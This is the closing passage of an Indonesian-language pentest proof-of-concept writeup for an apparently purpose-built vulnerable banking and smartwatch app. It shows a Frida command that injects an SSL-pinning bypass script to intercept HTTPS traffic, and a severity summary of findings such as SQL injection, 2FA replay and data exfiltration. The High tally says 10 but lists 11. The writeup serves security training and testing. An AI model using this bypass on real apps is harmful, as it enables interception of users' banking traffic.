     ```bash
     frida -D emulator-5554 -f com.nexorabank.omniwear -l bypass_pinning.js
     ```
  3. Ulangi "Run Real Pinned Request" → kini **BYPASSED**; arahkan proxy ke Burp (lihat `PANDUAN` Metode C) untuk intercept.
  - **Amati:** trafik HTTPS terbaca di Burp tanpa `SSLPeerUnverifiedException`.
- **Rekomendasi:** Pinning + Play Integrity/attestation; deteksi instrumentasi server-side; rotasi pin via config tertandatangani.
- **Referensi:** `PANDUAN §1`; `PinnedNetworkModule.kt`.

---

## ✅ Ringkasan untuk Laporan

- **Critical (4):** #1 SQLi, #3 Negative Transfer, #7 2FA Replay, #18 OOB 2FA Hijack.
- **High (10):** #2 BOLA, #4 Health Exfil, #5 Card-Freeze, #6 QRIS Replay, #8 ATM Brute, #9 ATM Race, #10 Deep Link, #12 Quick-Pay, #14 BLE Inject, #15 PIN/Storage, #16 Health Storage.
- **Medium (7):** #11 Tapjack, #13 OTP Snoop, #17 Backup, #19 Root Bypass, #20 Wrist-Off, #21 SSL Pinning.

> Seluruh POC di dokumen ini sudah **diverifikasi live** pada setup HP fisik non-root + emulator Wear OS rooted (backend seeded Rp 100.000.000). CVSS v4.0 adalah estimasi asesmen; sesuaikan vektor **Environmental** dengan konteks produksi Anda.

---
*Nexora OmniWear Suite — POC Writeup. Lihat [`PANDUAN-DEMO-PENTEST.md`](PANDUAN-DEMO-PENTEST.md) untuk setup lengkap, Frida, dan cheatsheet.*
